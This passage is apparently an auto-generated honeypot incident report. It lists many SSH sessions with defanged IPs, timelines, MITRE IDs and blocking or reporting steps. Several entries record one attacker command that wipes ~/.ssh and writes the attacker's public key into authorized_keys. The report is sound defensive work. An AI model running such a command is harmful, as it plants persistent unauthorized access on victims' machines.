| `2026-04-14 10:15:09` | `cowrie.session.connect` |
| `2026-04-14 10:15:09` | `cowrie.client.version` |
| `2026-04-14 10:15:10` | `cowrie.client.kex` |
| `2026-04-14 10:15:10` | `cowrie.login.success` |
| `2026-04-14 10:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ee013598dd2

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 10:16 |
| **Last Seen** | 2026-04-14 10:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:16:12` | `cowrie.session.connect` |
| `2026-04-14 10:16:12` | `cowrie.client.version` |
| `2026-04-14 10:16:12` | `cowrie.client.kex` |
| `2026-04-14 10:16:12` | `cowrie.login.success` |
| `2026-04-14 10:16:12` | `cowrie.session.params` |
| `2026-04-14 10:16:12` | `cowrie.command.input` |
| `2026-04-14 10:16:12` | `cowrie.command.failed` |
| `2026-04-14 10:16:12` | `cowrie.log.closed` |
| `2026-04-14 10:16:13` | `cowrie.session.params` |
| `2026-04-14 10:16:13` | `cowrie.command.input` |
| `2026-04-14 10:16:13` | `cowrie.session.file_download` |
| `2026-04-14 10:16:13` | `cowrie.log.closed` |
| `2026-04-14 10:16:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee95239d3cba

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 10:16 |
| **Last Seen** | 2026-04-14 10:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:16:14` | `cowrie.session.connect` |
| `2026-04-14 10:16:14` | `cowrie.client.version` |
| `2026-04-14 10:16:14` | `cowrie.client.kex` |
| `2026-04-14 10:16:15` | `cowrie.login.success` |
| `2026-04-14 10:16:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c7f963e47f3

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 10:16 |
| **Last Seen** | 2026-04-14 10:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:16:36` | `cowrie.session.connect` |
| `2026-04-14 10:16:36` | `cowrie.client.version` |
| `2026-04-14 10:16:37` | `cowrie.client.kex` |
| `2026-04-14 10:16:38` | `cowrie.login.success` |
| `2026-04-14 10:16:39` | `cowrie.session.params` |
| `2026-04-14 10:16:39` | `cowrie.command.input` |
| `2026-04-14 10:16:39` | `cowrie.command.failed` |
| `2026-04-14 10:16:39` | `cowrie.log.closed` |
| `2026-04-14 10:16:40` | `cowrie.session.params` |
| `2026-04-14 10:16:40` | `cowrie.command.input` |
| `2026-04-14 10:16:40` | `cowrie.session.file_download` |
| `2026-04-14 10:16:40` | `cowrie.log.closed` |
| `2026-04-14 10:16:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55cf7ce423da

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 10:16 |
| **Last Seen** | 2026-04-14 10:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:16:44` | `cowrie.session.connect` |
| `2026-04-14 10:16:44` | `cowrie.client.version` |
| `2026-04-14 10:16:44` | `cowrie.client.kex` |
| `2026-04-14 10:16:45` | `cowrie.login.success` |
| `2026-04-14 10:16:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d02a0930d5ef

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 10:18 |
| **Last Seen** | 2026-04-14 10:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:18:30` | `cowrie.session.connect` |
| `2026-04-14 10:18:30` | `cowrie.client.version` |
| `2026-04-14 10:18:31` | `cowrie.client.kex` |
| `2026-04-14 10:18:32` | `cowrie.login.success` |
| `2026-04-14 10:18:33` | `cowrie.session.params` |
| `2026-04-14 10:18:33` | `cowrie.command.input` |
| `2026-04-14 10:18:33` | `cowrie.command.failed` |
| `2026-04-14 10:18:33` | `cowrie.log.closed` |
| `2026-04-14 10:18:34` | `cowrie.session.params` |
| `2026-04-14 10:18:34` | `cowrie.command.input` |
| `2026-04-14 10:18:34` | `cowrie.session.file_download` |
| `2026-04-14 10:18:34` | `cowrie.log.closed` |
| `2026-04-14 10:18:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d8a8226e23a

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 10:18 |
| **Last Seen** | 2026-04-14 10:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:18:38` | `cowrie.session.connect` |
| `2026-04-14 10:18:38` | `cowrie.client.version` |
| `2026-04-14 10:18:39` | `cowrie.client.kex` |
| `2026-04-14 10:18:40` | `cowrie.login.success` |
| `2026-04-14 10:18:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ebf2ac072a

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 10:24 |
| **Last Seen** | 2026-04-14 10:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:24:42` | `cowrie.session.connect` |
| `2026-04-14 10:24:42` | `cowrie.client.version` |
| `2026-04-14 10:24:42` | `cowrie.client.kex` |
| `2026-04-14 10:24:42` | `cowrie.login.success` |
| `2026-04-14 10:24:43` | `cowrie.session.params` |
| `2026-04-14 10:24:43` | `cowrie.command.input` |
| `2026-04-14 10:24:43` | `cowrie.command.failed` |
| `2026-04-14 10:24:43` | `cowrie.log.closed` |
| `2026-04-14 10:24:43` | `cowrie.session.params` |
| `2026-04-14 10:24:43` | `cowrie.command.input` |
| `2026-04-14 10:24:43` | `cowrie.session.file_download` |
| `2026-04-14 10:24:43` | `cowrie.log.closed` |
| `2026-04-14 10:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93e52f7d426e

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 10:24 |
| **Last Seen** | 2026-04-14 10:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:24:45` | `cowrie.session.connect` |
| `2026-04-14 10:24:45` | `cowrie.client.version` |
| `2026-04-14 10:24:45` | `cowrie.client.kex` |
| `2026-04-14 10:24:45` | `cowrie.login.success` |
| `2026-04-14 10:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb080c7c6bb9

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 10:24 |
| **Last Seen** | 2026-04-14 10:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:24:46` | `cowrie.session.connect` |
| `2026-04-14 10:24:46` | `cowrie.client.version` |
| `2026-04-14 10:24:46` | `cowrie.client.kex` |
| `2026-04-14 10:24:47` | `cowrie.login.success` |
| `2026-04-14 10:24:48` | `cowrie.session.params` |
| `2026-04-14 10:24:48` | `cowrie.command.input` |
| `2026-04-14 10:24:48` | `cowrie.command.failed` |
| `2026-04-14 10:24:48` | `cowrie.log.closed` |
| `2026-04-14 10:24:48` | `cowrie.session.params` |
| `2026-04-14 10:24:48` | `cowrie.command.input` |
| `2026-04-14 10:24:49` | `cowrie.session.file_download` |
| `2026-04-14 10:24:49` | `cowrie.log.closed` |
| `2026-04-14 10:24:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bca22dc9c271

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 10:24 |
| **Last Seen** | 2026-04-14 10:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:24:51` | `cowrie.session.connect` |
| `2026-04-14 10:24:51` | `cowrie.client.version` |
| `2026-04-14 10:24:52` | `cowrie.client.kex` |
| `2026-04-14 10:24:52` | `cowrie.login.success` |
| `2026-04-14 10:24:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fe7e674c41e

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 10:26 |
| **Last Seen** | 2026-04-14 10:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:26:20` | `cowrie.session.connect` |
| `2026-04-14 10:26:20` | `cowrie.client.version` |
| `2026-04-14 10:26:21` | `cowrie.client.kex` |
| `2026-04-14 10:26:22` | `cowrie.login.success` |
| `2026-04-14 10:26:22` | `cowrie.session.params` |
| `2026-04-14 10:26:22` | `cowrie.command.input` |
| `2026-04-14 10:26:22` | `cowrie.command.failed` |
| `2026-04-14 10:26:23` | `cowrie.log.closed` |
| `2026-04-14 10:26:23` | `cowrie.session.params` |
| `2026-04-14 10:26:23` | `cowrie.command.input` |
| `2026-04-14 10:26:24` | `cowrie.session.file_download` |
| `2026-04-14 10:26:24` | `cowrie.log.closed` |
| `2026-04-14 10:26:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-587802baf5a1

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 10:26 |
| **Last Seen** | 2026-04-14 10:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:26:24` | `cowrie.session.connect` |
| `2026-04-14 10:26:24` | `cowrie.client.version` |
| `2026-04-14 10:26:24` | `cowrie.client.kex` |
| `2026-04-14 10:26:25` | `cowrie.login.success` |
| `2026-04-14 10:26:25` | `cowrie.session.params` |
| `2026-04-14 10:26:25` | `cowrie.command.input` |
| `2026-04-14 10:26:25` | `cowrie.command.failed` |
| `2026-04-14 10:26:26` | `cowrie.log.closed` |
| `2026-04-14 10:26:26` | `cowrie.session.params` |
| `2026-04-14 10:26:26` | `cowrie.command.input` |
| `2026-04-14 10:26:26` | `cowrie.session.file_download` |
| `2026-04-14 10:26:26` | `cowrie.log.closed` |
| `2026-04-14 10:26:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e456ca11a4e

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 10:26 |
| **Last Seen** | 2026-04-14 10:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:26:28` | `cowrie.session.connect` |
| `2026-04-14 10:26:28` | `cowrie.client.version` |
| `2026-04-14 10:26:28` | `cowrie.client.kex` |
| `2026-04-14 10:26:29` | `cowrie.login.success` |
| `2026-04-14 10:26:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72a8b4352fdb

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 10:26 |
| **Last Seen** | 2026-04-14 10:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:26:29` | `cowrie.session.connect` |
| `2026-04-14 10:26:29` | `cowrie.client.version` |
| `2026-04-14 10:26:29` | `cowrie.client.kex` |
| `2026-04-14 10:26:30` | `cowrie.login.success` |
| `2026-04-14 10:26:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a29f8e2efd7

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 10:28 |
| **Last Seen** | 2026-04-14 10:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:28:07` | `cowrie.session.connect` |
| `2026-04-14 10:28:07` | `cowrie.client.version` |
| `2026-04-14 10:28:08` | `cowrie.client.kex` |
| `2026-04-14 10:28:08` | `cowrie.login.success` |
| `2026-04-14 10:28:08` | `cowrie.session.params` |
| `2026-04-14 10:28:08` | `cowrie.command.input` |
| `2026-04-14 10:28:08` | `cowrie.command.failed` |
| `2026-04-14 10:28:08` | `cowrie.log.closed` |
| `2026-04-14 10:28:08` | `cowrie.session.params` |
| `2026-04-14 10:28:08` | `cowrie.command.input` |
| `2026-04-14 10:28:08` | `cowrie.session.file_download` |
| `2026-04-14 10:28:08` | `cowrie.log.closed` |
| `2026-04-14 10:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b005a01865be

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 10:28 |
| **Last Seen** | 2026-04-14 10:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:28:10` | `cowrie.session.connect` |
| `2026-04-14 10:28:10` | `cowrie.client.version` |
| `2026-04-14 10:28:10` | `cowrie.client.kex` |
| `2026-04-14 10:28:10` | `cowrie.login.success` |
| `2026-04-14 10:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-507d2c35a7bc

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 10:32 |
| **Last Seen** | 2026-04-14 10:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
